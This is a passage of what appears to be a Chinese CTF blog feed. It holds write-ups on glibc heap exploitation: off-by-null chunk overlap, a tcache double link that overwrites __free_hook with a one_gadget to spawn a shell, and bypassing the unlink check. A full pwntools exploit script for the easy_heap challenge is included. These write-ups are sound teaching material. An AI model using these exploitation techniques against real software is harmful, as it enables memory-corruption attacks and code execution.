class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p><p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p><p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p><p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p><p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p><p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p><p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p><p>下面新建 3 个 chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure><p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p><p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p><p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p><h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p><p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p><p><img alt="" data-src="/imgs/off-by-null-11.png" class="lozad"></p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin .</p><p>每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。</p><p>首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>此时的内存布局为</p><p><img alt="" data-src="/imgs/off-by-null-12.png" class="lozad"></p><p>接下来利用 off by null 构造 overlap chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C .</li><li>然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。</li><li>然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</li><li>然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B</li></ul><p><img alt="" data-src="/imgs/off-by-null-13.png" class="lozad"></p><p>下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 把剩下的 tcache 里面的 bin 消耗掉</span><br><span class="line">for i in range(7):</span><br><span class="line">    malloc(8, &apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span><br><span class="line">malloc(1, &apos;8&apos;)</span><br></pre></td></tr></table></figure><p>首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。</p><p>然后打印 chunk 1 的内容，拿到 libc 的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br></pre></td></tr></table></figure></p><p>下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># 为了给后续申请腾出空间</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><ul><li>首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。</li><li>然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A .</li></ul><p><img alt="" data-src="/imgs/off-by-null-14.png" class="lozad"></p><p>然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-15.png" class="lozad"><br>最后触发 free , 调用 one_gadget ，拿到 shell.</p><p>完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-v']</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">"easy_heap"</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">bin = ELF(path)</span><br><span class="line"></span><br><span class="line">p = process(path, aslr=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'command?'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index'</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64((p.recvline()[:<span class="number">-1</span>]).ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先释放后面的 chunk 填满 tcahe</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted bin</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  chunk 1 的 pre_size 为 0x100</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 2 的 pre_size 为 0x200</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 tcache 分配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">1</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配 unsorted bin</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'7'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次让 chunk 回到 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk 7 进入 unsorted bin</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 此时的分配会从 tcache 里面拿 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次 free chunk 8, 此时 tcache 没满，进入 tcache</span></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这时分配到的是 chunk 8 位于索引 1</span></span><br><span class="line"><span class="comment"># 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0</span></span><br><span class="line">malloc(<span class="number">0xf8</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free 0 填充 tcache</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放 chunk 9 ，触发堆合并，形成 overlap chunk</span></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把剩下的 tcache 里面的 bin 消耗掉</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    malloc(<span class="number">8</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leak</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line">leak = puts(<span class="number">1</span>)</span><br><span class="line">libc.address = leak - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x70</span></span><br><span class="line">info(<span class="string">"libc.address : "</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunk</span></span><br><span class="line">malloc(<span class="number">1</span>, <span class="string">'9'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0xe42ee</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hook</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># 再次分配到 A</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分配到 free_hook, 然后修改 free_hook 为 system</span></span><br><span class="line">malloc(<span class="number">8</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free_hook</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>参考<br><a href="https://www.cnblogs.com/hac425/p/9993716.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9993716.html</a><br><a href="https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.py</a><br><a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。&lt;/p&gt;
&lt;p&gt;题目
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>unlink</title>
    <link href="https://nocbtm.github.io/2020/02/27/unlink/"/>
    <id>https://nocbtm.github.io/2020/02/27/unlink/</id>
    <published>2020-02-27T06:38:52.000Z</published>
    <updated>2020-04-08T14:04:21.111Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p><p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure><p>unlink操作的简要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p><ol><li>有一个指向heap内的指针；</li><li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li><li>可以对这个指针进行多次写入；</li><li>然后我们想办法修改p的fd和p的bk分别为:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure><p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span 